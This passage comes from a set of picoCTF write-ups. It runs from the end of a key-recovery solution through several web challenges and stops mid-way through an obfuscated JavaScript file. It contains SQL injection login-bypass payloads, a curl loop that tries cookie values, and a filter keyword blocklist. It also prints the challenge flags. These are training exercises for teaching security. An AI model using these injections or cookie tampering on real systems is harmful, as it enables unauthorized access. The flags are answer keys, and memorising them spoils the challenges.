  document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
  return false;
}
~~~

This is very similar to before however the key is fragmented before the image is manipulated.  We can solve for the shifter as before:

The image return with default key is encoded in base64:

~~~
5FAncQCUAI/8rOEG3PNE/z8ApPMNfxoenjCuRAZ3X4DIAL8cAGsBRfPqTg2wQm6uGxC8R4fkROtkwNsA60jl5ziUlnKN92X+rEWr7VrASXUrmk4Clv6B/HwA/0euTZhbiQ0BX0U7tACkAE7pSav/9QDFAACFAPMK/3gAVQCZgcOk30aqzQowckkcAPOa/Q+CMCDcPiUAI0EA2JyqgTtaUnBomQwtSd1pAZMgYkTdiWxC0L9vHS0evlTvpp92TZekjPoi0hgt09+kxUoezoR/Zm8kmZAJSwrOWWa81Ge/RxScfkmz44MhReLfYFjW/Fv4jtvHocRiYAA7fc0DSs48HkXSc5CmSfl6gOWZ7efN/HpHAI++Rv9nyEGIrKbjODey+P/19xiq/aWcgh9fPTmUN5//H2Aaw7lggfzpJCRckm9xtPLSr9AdP2b2rJr4vwz4FpmMtD2XbwCKcWVZSX24DwwIQZBI7/k/qG7vxp45T+sjpcX4M99rB4TZfv+pyd8hzrWeAaY399tbWw74c5VpXXWC8lTilFNU6HW1mzMfBLT87aHDzqSvSxP1wkG67z7902+Cmhj+ydbC/mmtrgWfrQi0chfKNSfzrVc7Xz1FQNt6jz4IiDNikoBD8X7Ypqbq8r/PnfI1/idOxdfFGiGwJMFxl9ODOZ6zVnGLdDtkB72kLcj7egzf/bNnSuT+WZtTBa0g5n7Jx8dWW35yPmlbhLe888FN2fOnyb57R8RudXNMOmc9vnI6guhuq5PzSZ3KHuvw767grJU1jarOIjfU4+WYgtndm91mMFdtPutrljpAEo4EuxhGhbSv3w0Wv37/vMZJdyicX2+gT5vf6opiB5F/Go2uz7Mfv3r76b9ProKgvuj057/had6f/S4lmwPUtu/6lWbE9WvhX366funik70zxR7OTe+AuLD/auyRYKA=
~~~

This can be decoded to Hex:

~~~
e45027710094008ffcace106dcf344ff3f00a4f30d7f1a1e9e30ae4406775f80c800bf1c006b0145f3ea4e0db0426eae1b10bc4787e444eb64c0db00eb48e5e7389496728df765feac45abed5ac049752b9a4e0296fe81fc7c00ff47ae4d985b890d015f453bb400a4004ee949abfff500c500008500f30aff780055009981c3a4df46aacd0a3072491c00f39afd0f823020dc3e2500234100d89caa813b5a527068990c2d49dd690193206244dd896c42d0bf6f1d2d1ebe54efa69f764d97a48cfa22d2182dd3dfa4c54a1ece847f666f249990094b0ace5966bcd467bf47149c7e49b3e3832145e2df6058d6fc5bf88edbc7a1c46260003b7dcd034ace3c1e45d27390a649f97a80e599ede7cdfc7a47008fbe46ff67c84188aca6e33837b2f8fff5f718aafda59c821f5f3d3994379fff1f601ac3b96081fce924245c926f71b4f2d2afd01d3f66f6ac9af8bf0cf816998cb43d976f008a716559497db80f0c08419048eff93fa86eefc69e394feb23a5c5f833df6b0784d97effa9c9df21ceb59e01a637f7db5b5b0ef87395695d7582f254e2945354e875b59b331f04b4fceda1c3cea4af4b13f5c241baef3efdd36f829a18fec9d6c2fe69adae059fad08b47217ca3527f3ad573b5f3d4540db7a8f3e08883362928043f17ed8a6a6eaf2bfcf9df235fe274ec5d7c51a21b024c17197d383399eb356718b743b6407bda42dc8fb7a0cdffdb3674ae4fe599b5305ad20e67ec9c7c7565b7e723e695b84b7bcf3c14dd9f3a7c9be7b47c46e75734c3a673dbe723a82e86eab93f3499dca1eebf0efaee0ac95358daace2237d4e3e59882d9dd9bdd6630576d3eeb6b963a40128e04bb184685b4afdf0d16bf7effbcc64977289c5f6fa04f9bdfea8a6207917f1a8daecfb31fbf7afbe9bf4fae82a0bee8f4e7bfe169de9ffd2e259b03d4b6effa9566c4f56be15f7eba7ee9e293bd33c51ece4def80b8b0ff6aec9160a0
~~~

This can be loaded into Python and an integer array can be generated as in the previous challenge.  We can subsequently locate all locations of these Bytes in the image data:

~~~py
def find_in_arr(num,arr):
    return [i for i, x in enumerate(arr) if x == num]

hexstr = "e45027710094008ffcace106dcf344ff3f00a4f30d7f1a1e9e30ae4406775f80c800bf1c006b0145f3ea4e0db0426eae1b10bc4787e444eb64c0db00eb48e5e7389496728df765feac45abed5ac049752b9a4e0296fe81fc7c00ff47ae4d985b890d015f453bb400a4004ee949abfff500c500008500f30aff780055009981c3a4df46aacd0a3072491c00f39afd0f823020dc3e2500234100d89caa813b5a527068990c2d49dd690193206244dd896c42d0bf6f1d2d1ebe54efa69f764d97a48cfa22d2182dd3dfa4c54a1ece847f666f249990094b0ace5966bcd467bf47149c7e49b3e3832145e2df6058d6fc5bf88edbc7a1c46260003b7dcd034ace3c1e45d27390a649f97a80e599ede7cdfc7a47008fbe46ff67c84188aca6e33837b2f8fff5f718aafda59c821f5f3d3994379fff1f601ac3b96081fce924245c926f71b4f2d2afd01d3f66f6ac9af8bf0cf816998cb43d976f008a716559497db80f0c08419048eff93fa86eefc69e394feb23a5c5f833df6b0784d97effa9c9df21ceb59e01a637f7db5b5b0ef87395695d7582f254e2945354e875b59b331f04b4fceda1c3cea4af4b13f5c241baef3efdd36f829a18fec9d6c2fe69adae059fad08b47217ca3527f3ad573b5f3d4540db7a8f3e08883362928043f17ed8a6a6eaf2bfcf9df235fe274ec5d7c51a21b024c17197d383399eb356718b743b6407bda42dc8fb7a0cdffdb3674ae4fe599b5305ad20e67ec9c7c7565b7e723e695b84b7bcf3c14dd9f3a7c9be7b47c46e75734c3a673dbe723a82e86eab93f3499dca1eebf0efaee0ac95358daace2237d4e3e59882d9dd9bdd6630576d3eeb6b963a40128e04bb184685b4afdf0d16bf7effbcc64977289c5f6fa04f9bdfea8a6207917f1a8daecfb31fbf7afbe9bf4fae82a0bee8f4e7bfe169de9ffd2e259b03d4b6effa9566c4f56be15f7eba7ee9e293bd33c51ece4def80b8b0ff6aec9160a0"
intarr = [0]*int(len(hexstr)/2)


for i in range(0,len(hexstr),2):
    hexchar = hexstr[i]+hexstr[i+1]
    intchar = int(hexchar,16)
    intarr[int(i/2)] = intchar

pngarr = [137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82]

pngloc = []

for i in range(0,len(pngarr),1):
    index = i
    value = pngarr[i]
    locs = find_in_arr(value,intarr)
    count = len(locs)
    pngdict = {"index":index, "value":value, "count":count, "locs":locs}
    pngloc.append(pngdict)
~~~

The outpu is summarised in the table below.

| PNG Index | Value | Count in File | Byte Locations |
|-----------|-------|---------------|----------------|
|  0        | 137   |  2            | [ 96, 174 ] |
|  1        |  80   |  1            | [  1 ] |
|  2        |  78   |  4            | [ 42, 82, 106, 488 ] |
|  3        |  71   |  5            | [ 51, 91, 222, 272, 555 ] |
|  4        |  13   |  4            | [ 20, 43, 97, 619 ] |
|  5        |  10   |  3            | [ 119, 133, 214 ] |
|  6        |  26   |  4            | [ 22, 308, 492, 642 ] |
|  7        |  10   |  3            | [ 119, 133, 214 ] |
|  8        |   0   | 21            | [ 4, 6, 17, 33, 36, 59, 89, 103, 105, 112, 114, 115, 117, 122, 124, 138, 149, 152, 247, 279, 343 ] |
|  9        |   0   | 21            | [ 4, 6, 17, 33, 36, 59, 89, 103, 105, 112, 114, 115, 117, 122, 124, 138, 149, 152, 247, 279, 343 ] |
| 10        |   0   | 21            | [ 4, 6, 17, 33, 36, 59, 89, 103, 105, 112, 114, 115, 117, 122, 124, 138, 149, 152, 247, 279, 343 ] |
| 11        |  13   |  4            | [ 20, 43, 97, 619 ] |
| 12        |  73   |  9            | [ 78, 108, 136, 165, 226, 261, 348, 573, 626 ] |
| 13        |  72   |  2            | [ 61, 356 ] |
| 14        |  68   |  4            | [ 14, 27, 54, 172 ] |
| 15        |  82   |  1            | [ 159 ] |

The total number of possible keys is now 6,618,931,200.

We have 2 Bytes in the PNG header that occur once in the enciphered PNG image.  We can solve the key for these two components:

~~~js
for (var j = 0; j < (bytes.length / LEN); j++) {
  result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
}
~~~

We know the LEN value is set at 16 and for PNG header Byte 2 at index 1: j=0 and i=1.  The length of the file is 704 Bytes (bytes.length = 704).

~~~
result[1] = bytes[((shifter * 16) % 704) + 1]
~~~

This Byte has a scrambled index at 1 also.  Therefore:

~~~
16*shifter%704 + 1 = 1
16*shifter%704 = 0.
~~~

This gives us possible values for the shifter at i=1:

~~~
16*shifter = n*704
shifter = n*44
~~~

We can also solve the shifter for index 15:

~~~
result[15] = bytes[((shifter * 16) % 704) + 15]
~~~

We know this Byte is located at index 159 in the enciphered image:

~~~
((shifter * 16) % 704) + 15 = 159
(shifter * 16) % 704 = 144
shifter * 16 = 144 + n*704
shifter = 9 + n*44
~~~

We can generate a shifter array which can be solved later for the key:

| Shifter Index | Possible values |
|  0 |  |
|  1 | n*44 |
|  2 |  |
|  3 |  |
|  4 |  |
|  5 |  |
|  6 |  |
|  7 |  |
|  8 |  |
|  9 |  |
| 10 |  |
| 11 |  |
| 12 |  |
| 13 |  |
| 14 |  |
| 15 | 9 +n*44 |

We can reduce this to usable ASCII characters: 31 < charindex < 127

We can iterate through all the Byte solutions for the PNG header and remove any values that are infeasible:

~~~
(loc - i)%16 != 0 -> invalid
(loc - i)/16 >128 -> invalid
otherwise -> valid
~~~

Our solution table now is:

| PNG Index | Value | Count in File | Byte Locations |
|-----------|-------|---------------|----------------|
|  0        | 137   |  1            | [  96 ] |
|  1        |  80   |  1            | [   1 ] |
|  2        |  78   |  1            | [  82 ] |
|  3        |  71   |  1            | [  51 ] |
|  4        |  13   |  1            | [  20 ] |
|  5        |  10   |  1            | [ 133 ] |
|  6        |  26   |  1            | [  22 ] |
|  7        |  10   |  1            | [ 119 ] |
|  8        |   0   |  1            | [ 152 ] |
|  9        |   0   |  2            | [  89, 105 ] |
| 10        |   0   |  2            | [ 122, 138 ] |
| 11        |  13   |  2            | [  43, 619 ] |
| 12        |  73   |  2            | [ 108, 348 ] |
| 13        |  72   |  1            | [ 61 ] |
| 14        |  68   |  1            | [ 14 ] |
| 15        |  82   |  1            | [ 159 ] |

The total number of possible keys is now 16.

| Index | Value | Solution number | Shifter Value |
|  0    | 137   | 1               |  6 + 44n      | 
|  1    |  80   | 1               |  0 + 44n      | 
|  2    |  78   | 1               |  5 + 44n      | 
|  3    |  71   | 1               |  3 + 44n      | 
|  4    |  13   | 1               |  1 + 44n      | 
|  5    |  10   | 1               |  8 + 44n      | 
|  6    |  26   | 1               |  1 + 44n      | 
|  7    |  10   | 1               |  7 + 44n      | 
|  8    |   0   | 1               |  9 + 44n      | 
|  9    |   0   | 1               |  5 + 44n      | 
|  9    |   0   | 2               |  6 + 44n      | 
| 10    |   0   | 1               |  7 + 44n      | 
| 10    |   0   | 2               |  8 + 44n      | 
| 11    |  13   | 1               |  2 + 44n      | 
| 11    |  13   | 2               | 38 + 44n      | 
| 12    |  73   | 1               |  6 + 44n      | 
| 12    |  73   | 2               | 21 + 44n      | 
| 13    |  72   | 1               |  3 + 44n      | 
| 14    |  68   | 1               |  0 + 44n      | 
| 15    |  82   | 1               |  9 + 44n      | 

We can remove the infeasible characters and setting n=0, we now have 4 possible keys:

~~~
key 1 = 6053181795726309
key 2 = 6053181795826309
key 3 = 6053181796726309
key 4 = 6053181796826309
~~~

We have a set of solutions from which we can generate possible keys.  We can see the shifter is generated from the user input.  Each shifter value is generated from the concatenation of two userinput character Bytes.  We can append any character to the shifter integer to generate 4 user inputs:

~~~
ui 1 = 6a0a5a3a1a8a1a7a9a5a7a2a6a3a0a9a
ui 2 = 6a0a5a3a1a8a1a7a9a5a8a2a6a3a0a9a
ui 3 = 6a0a5a3a1a8a1a7a9a6a7a2a6a3a0a9a
ui 4 = 6a0a5a3a1a8a1a7a9a6a8a2a6a3a0a9a
~~~

Attempting the first input, we receive a png qr-code which can be decoded to reveal the flag picoCTF{59d5db659865190a07120652e6c77f84}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{59d5db659865190a07120652e6c77f84}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Web Gauntlet

- Author: madStacks
- 200 points

### Description

Can you beat the filters? Log in as admin http://jupiter.challenges.picoctf.org:54319/ http://jupiter.challenges.picoctf.org:54319/filter.php

### Hints

1. You are not allowed to login with valid credentials.
2. Write down the injections you use in case you lose your progress.
3. For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
4. sqlite.
5. If your cookie keeps getting reset, try using a private browser window.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

This challenge is the first [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) challenge in picoCTF picoGym.  As given in the hints, the website uses SQLite. 

We can complete this challenge using only a browser and select inputs to the login form.  A subpage , filter.php, validates and sanitises the POST form input.

The first round, has username and password inputs and the filter.php provides:

~~~php
Round1: or
~~~

This shows us that the filter will block and OR statments submitted at index.php.

We can try test POST parameters in the login form with username=test and password=test we get a query string presented on index.php:

~~~sql
SELECT * FROM users WHERE username='test' AND password='test' 
~~~

We can use a SQLite cheat sheet at [atta.cked.me](http://atta.cked.me/home/sqlite3injectioncheatsheet).  The comments character is '--'.

Further details at [netsparker.com](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#LineComments) suggests that the username admin'-- will log us in as admin user by commenting out the password comparator.

We can enter into the form: username=admin'--, password=test.

This provides the query string:

~~~sql
SELECT * FROM users WHERE username='admin'--' AND password='test' 
~~~

We are now at round 2, the filter.php now shows:

~~~php
Round2: or and like = --
~~~

This filter will remove any "OR", "AND", "LIKE" "=" and "--" strings from our form inputs.  We cannot use the same inputs as before.

We can try using a comment block to break up the -- input, username=admin'-/*comment*/-, password=test however this does not work:

~~~sql
SELECT * FROM users WHERE username='admin'-/*break*/-' AND password='test' 
~~~

We get a html response: Invalid username/password.  Alternatively, we can stack the query with the aim of bypassingthe password query with username=admin';, password=test:

We get the following query string:

~~~sql
SELECT * FROM users WHERE username='admin';' AND password='test' 
~~~

And we are on to round 3.  The filter.php now shows:

~~~php
Round3: or and = like > < --
~~~

This is the same as before, but removes < and >.  We can try the same query as before, username=admin';, password=test:

~~~sql
SELECT * FROM users WHERE username='admin';' AND password='test' 
~~~

And we are in to round 4.  The filter now has:

~~~php
Round4: or and = like > < -- admin
~~~

This is removing the same as before, but in addition the string "admin".  The injection sheet has a concatenation statement '||' we can use this to split the username and attempt to bypass the filter, username=adm'||'in';, password=test:

~~~sql
SELECT * FROM users WHERE username='adm'||'in';' AND password='test' 
~~~

We are on to round 5.  php.filter:

~~~php
Round5: or and = like > < -- union admin
~~~

We can use the same form inputs as before, username=adm'||'in';, password=test:

~~~sql
SELECT * FROM users WHERE username='adm'||'in';' AND password='test' 
~~~

We are into round 6 and the filter.php now shows:

~~~php
 <?php
session_start();

if (!isset($_SESSION["round"])) {
    $_SESSION["round"] = 1;
}
$round = $_SESSION["round"];
$filter = array("");
$view = ($_SERVER["PHP_SELF"] == "/filter.php");

if ($round === 1) {
    $filter = array("or");
    if ($view) {
        echo "Round1: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 2) {
    $filter = array("or", "and", "like", "=", "--");
    if ($view) {
        echo "Round2: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 3) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
    // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round3: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 4) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
    // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round4: ".implode(" ", $filter)."<br/>";
    }
} else if ($round === 5) {
    $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
    // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
    if ($view) {
        echo "Round5: ".implode(" ", $filter)."<br/>";
    }
} else if ($round >= 6) {
    if ($view) {
        highlight_file("filter.php");
    }
} else {
    $_SESSION["round"] = 1;
}

// picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
?> 
~~~

We find the flag picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}.

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{y0u_m4d3_1t_a5f58d5564fce237fbcc978af033c11b}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## GET aHEAD

- Author: MADSTACKS
- 20 Points

### Description

Find the flag being held on this server to get ahead of the competition http://mercury.picoctf.net:15931/

### Hints

1. Maybe you have more than 2 choices
2. Check out tools like Burpsuite to modify your requests and look at the responses

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can first inspect the webpage source:

~~~html
<!doctype html>
<html>
<head>
    <title>Blue</title>
    <link rel="stylesheet" type="text/css" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
	<style>body {background-color: blue;}</style>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-md-6">
					<div class="panel panel-primary" style="margin-top:50px">
						<div class="panel-heading">
							<h3 class="panel-title" style="color:red">Red</h3>
						</div>
						<div class="panel-body">
							<form action="index.php" method="GET">
								<input type="submit" value="Choose Red"/>
							</form>
						</div>
					</div>
				</div>
				<div class="col-md-6">
					<div class="panel panel-primary" style="margin-top:50px">
						<div class="panel-heading">
							<h3 class="panel-title" style="color:blue">Blue</h3>
						</div>
						<div class="panel-body">
							<form action="index.php" method="POST">
								<input type="submit" value="Choose Blue"/>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
~~~

This shows two HTTP Methods, GET and HEAD. The hints suggest that there may be more than 2 choices.  The HTTP methods are:

- GET
- POST
- PUT
- HEAD
- DELETE
- PATCH
- OPTIONS

The challenge title, Get aHead, suggests that HEAD is the third method to use.  HEAD is very similar to GET. HEAD is used to verify the response of GET requests.  We can send a HEAD request using curl:

~~~shell
$ curl --verbose --HEAD --silent http://mercury.picoctf.net:15931/index.php
*   Trying 18.189.209.142:15931...
* TCP_NODELAY set
* Connected to mercury.picoctf.net (18.189.209.142) port 15931 (#0)
> HEAD /index.php HTTP/1.1
> Host: mercury.picoctf.net:15931
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< flag: picoCTF{r3j3ct_th3_du4l1ty_82880908}
flag: picoCTF{r3j3ct_th3_du4l1ty_82880908}
< Content-type: text/html; charset=UTF-8
Content-type: text/html; charset=UTF-8

< 
* Connection #0 to host mercury.picoctf.net left intact
~~~

This provides the flag:

~~~
picoCTF{r3j3ct_th3_du4l1ty_82880908}
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{r3j3ct_th3_du4l1ty_82880908}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Cookies

- Author: MADSTACKS
- 40 Points

### Description

Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:21485/

### Hints

None

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can view the page source:

~~~html
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>


</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>
        
        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
        
      
      <div class="jumbotron">
        <p class="lead"></p>
		<div class="row">
			<div class="col-xs-12 col-sm-12 col-md-12">
				<h3>Welcome to my cookie search page. See how much I like different kinds of cookies!</h3>
			</div>
		</div>
		<br/>
        <div class="search-form">
            <form role="form" action="/search" method="post">
            <div class="row">
                <div class="form-group">
                    <input type="text" name="name" id="name" class="form-control input-lg" placeholder="snickerdoodle">
                </div>
            </div>
            <div class="row">
                <div class="col-xs-12 col-sm-12 col-md-12">
                    <input type="submit" class="btn btn-lg btn-success btn-block" value="Search">
                </div>
            </div>
        </form>
    </div>
</div>
    <footer class="footer">
        <p>&copy; PicoCTF</p>
    </footer>

</div>

<script>
$(document).ready(function(){
    $(".close").click(function(){
        $("myAlert").alert("close");
    });
});
</script>
</body>

</html>
~~~

This does not provide much information, however if we send a curl request:

~~~shell
$ curl -I http://mercury.picoctf.net:21485
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 209
Location: http://mercury.picoctf.net:21485/
Set-Cookie: name=-1; Path=/
~~~

This shows a cookie with field "name" set to -1.  If we change the cookie, we can look at the webpage response:

~~~shell
$ curl -i http://mercury.picoctf.net:21485/ -H "Cookie: name=1;" -L
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 219
Location: http://mercury.picoctf.net:21485/check

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 1780
Set-Cookie: session=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/

<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>
        
        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
        
        
        <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">
          <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            </div>
      
      
      
        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
    <script>
    $(document).ready(function(){
        $(".close").click(function(){
            $("myAlert").alert("close");
        });
    });
    </script>
</body>

</html>
~~~
	
We can see the webpage contents have changed.  If we iterate through various names, we may be able to find the flag:

~~~shell
$ for j in {0..100}; do echo "name = $j"; if curl -b name=$j --silent http://mercury.picoctf.net:21485/check | grep -o "\bpicoCTF{\w*}"; then break; fi; done;
~~~

This provides the flag when the name is set to 18:

~~~
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
~~~

</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Scavenger Hunt

- Author: MADSTACKS
- 50 Points

### Description

There is some interesting information hidden around this site http://mercury.picoctf.net:27393/. Can you find it?

### Hints

1. You should have enough hints to find the files, don't run a brute forcer.

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

We can view the site source code as shown below.  This gives us the first part of the flag in the HTML source:

~~~html
<!doctype html>
<html>
  <head>
    <title>Scavenger Hunt</title>
    <link href="https://fonts.googleapis.com/css?family=Open+Sans|Roboto" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="mycss.css">
    <script type="application/javascript" src="myjs.js"></script>
  </head>

  <body>
    <div class="container">
      <header>
		<h1>Just some boring HTML</h1>
      </header>

      <button class="tablink" onclick="openTab('tabintro', this, '#222')" id="defaultOpen">How</button>
      <button class="tablink" onclick="openTab('tababout', this, '#222')">What</button>

      <div id="tabintro" class="tabcontent">
		<h3>How</h3>
		<p>How do you like my website?</p>
      </div>

      <div id="tababout" class="tabcontent">
		<h3>What</h3>
		<p>I used these to make this site: <br/>
		  HTML <br/>
		  CSS <br/>
		  JS (JavaScript)
		</p>
	<!-- Here's the first part of the flag: picoCTF{t -->
      </div>

    </div>

  </body>
</html>
~~~

This provides the beginning of the flag:

~~~
picoCTF{t
~~~

Next, we can view the stylesheet source:

~~~css
div.container {
    width: 100%;
}

header {
    background-color: black;
    padding: 1em;
    color: white;
    clear: left;
    text-align: center;
}

body {
    font-family: Roboto;
}

h1 {
    color: white;
}

p {
    font-family: "Open Sans";
}

.tablink {
    background-color: #555;
    color: white;
    float: left;
    border: none;
    outline: none;
    cursor: pointer;
    padding: 14px 16px;
    font-size: 17px;
    width: 50%;
}

.tablink:hover {
    background-color: #777;
}

.tabcontent {
    color: #111;
    display: none;
    padding: 50px;
    text-align: center;
}

#tabintro { background-color: #ccc; }
#tababout { background-color: #ccc; }

/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
~~~

This provides the second part of the flag, we now have:

~~~
picoCTF{th4ts_4_l0
~~~

Next, we can view the javascript source:

~~~js
function openTab(tabName,elmnt,color) {
    var i, tabcontent, tablinks;
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
	tabcontent[i].style.display = "none";
    }
    tablinks = document.getElementsByClassName("tablink");
    for (i = 0; i < tablinks.length; i++) {
	tablinks[i].style.backgroundColor = "";
    }
    document.getElementById(tabName).style.display = "block";
    if(elmnt.style != null) {
	elmnt.style.backgroundColor = color;
    }
}

window.onload = function() {
    openTab('tabintro', this, '#222');
}

/* How can I keep Google from indexing my website? */
~~~

This asks how we can stop google from indexing the website.  We know this is done through the sites [robots.txt](https://en.wikipedia.org/wiki/Robots_exclusion_standard) exclusion standard file, which we can enter into the navigation bar of the website:

~~~
User-agent: *
Disallow: /index.html
# Part 3: t_0f_pl4c
# I think this is an apache server... can you Access the next flag?
~~~

This provides the 3rd part of the flag.  The flag so far:

~~~
picoCTF{th4ts_4_l0t_0f_pl4c
~~~

The next hint tells us the website uses apache.  We can find a configuration file at [.htaccess](https://en.wikipedia.org/wiki/.htaccess) for apache servers:

~~~
# Part 4: 3s_2_lO0k
# I love making websites on my Mac, I can Store a lot of information there.
~~~

This provides the 4th part of the flag.  The flag so far:

~~~
picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k
~~~

The next hint, suggests that a file is present generated from use of an apple device when constructing the website.  A web search leads us to the [.DS_Store](https://en.wikipedia.org/wiki/.DS_Store) generated by Apple's Finder program to cache metadata from a directory.  Similar to the [INI file](https://en.wikipedia.org/wiki/INI_file) on Windows.

The file is case-sensitive and can be found at ~/.DS_Store:
	
~~~
Congrats! You completed the scavenger hunt. Part 5: _d375c750}
~~~

This provides the final part of the flag:

~~~
picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_d375c750}
~~~
	
</details>

### Answer

<details>

<summary markdown="span">Flag</summary>

~~~
picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_d375c750}
~~~

</details>

---

### [Web Exploitation](#contents) | [PicoCTF](./picoctf.md) | [Home](./index.md)

---

## Some Assembly Required 1

- Author: SEARS SCHULZ
- 70 Points

### Description

http://mercury.picoctf.net:15472/index.html

### Hints

None

### Solutions

<details>

<summary markdown="span">Solution 1</summary>

Inspecting the webpage we can find a suspicious javascript source:

~~~html
<html>
<head>
	<meta charset="UTF-8">
	<script src="G82XCw5CX3.js"></script>
</head>
<body>
	<h4>Enter flag:</h4>
	<input type="text" id="input"/>
	<button onclick="onButtonPress()">Submit</button>
	<p id="result"></p>
</body>
</html>
~~~

Opening the javascript file, G82XCw5CX3.js, we can review the javascript file:

~~~js
const _0x402c = ['value',
                 '2wfTpTR',
                 'instantiate',
                 '275341bEPcme',
                 'innerHTML',
                 '1195047NznhZg',
                 '1qfevql',
                 'input',
                 '1699808QuoWhA',
                 'Correct!',
                 'check_flag',
                 'Incorrect!',
                 './JIFxzHyW8W',
                 '23SMpAuA',
                 '802698XOMSrr',
                 'charCodeAt',
                 '474547vVoGDO',
                 'getElementById',
                 'instance',
                 'copy_char',
                 '43591XxcWUl',
                 '504454llVtzW',
                 'arrayBuffer',
                 '2NIQmVj',
                 'result'
                ];

const _0x4e0e = function (_0x553839, _0x53c021) {
    _0x553839 = _0x553839 - 0x1d6;
    let _0x402c6f = _0x402c[_0x553839];
    return _0x402c6f;
};
(function (_0x76dd13, _0x3dfcae) {
    const _0x371ac6 = _0x4e0e;
    while (!![]) {
        try {
            const _0x478583 = -parseInt(_0x371ac6(0x1eb)) + 
                  parseInt(_0x371ac6(0x1ed)) + 
                  -parseInt(_0x371ac6(0x1db)) * 
                  -parseInt(_0x371ac6(0x1d9)) + 
                  -parseInt(_0x371ac6(0x1e2)) * 
                  -parseInt(_0x371ac6(0x1e3)) + 
                  -parseInt(_0x371ac6(0x1de)) * 
